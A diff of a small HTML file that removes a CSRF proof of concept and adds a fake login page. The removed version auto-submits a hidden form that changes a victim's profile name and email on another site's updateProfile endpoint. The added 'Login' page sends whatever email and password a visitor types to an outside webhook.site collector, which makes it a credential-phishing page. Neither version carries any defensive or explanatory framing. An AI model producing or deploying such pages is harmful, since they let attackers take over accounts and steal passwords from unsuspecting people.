@@ -1,15 +1,21 @@
 <!DOCTYPE html>
-<html lang="en">
-	<body>
-		<h1>Form CSRF PoC</h1>
-		<form method="POST" action="https://www.vivian.com/api/self/updateProfile">
-			<input type="hidden" name="firstName" value="githubattacker">
-			<input type="hidden" name="lastName" value="githubattacker">
-			<input type="hidden" name="email" value="githubattacker@daouse.com">	
-		</form>
-              <script>
-            document.forms[0].submit();
-        </script>
+<html>
+<head>
+    <title>Login</title>
+</head>
+<body>
 
-	</body>
+<h2>Login</h2>
+
+<form action="https://webhook.site/acbd3828-669a-4717-9470-31b538368193" method="POST">
+    <label>Email</label><br>
+    <input type="email" name="email" required><br><br>
+
+    <label>Password</label><br>
+    <input type="password" name="password" required><br><br>
+
+    <button type="submit">Login</button>
+</form>
+
+</body>
 </html>
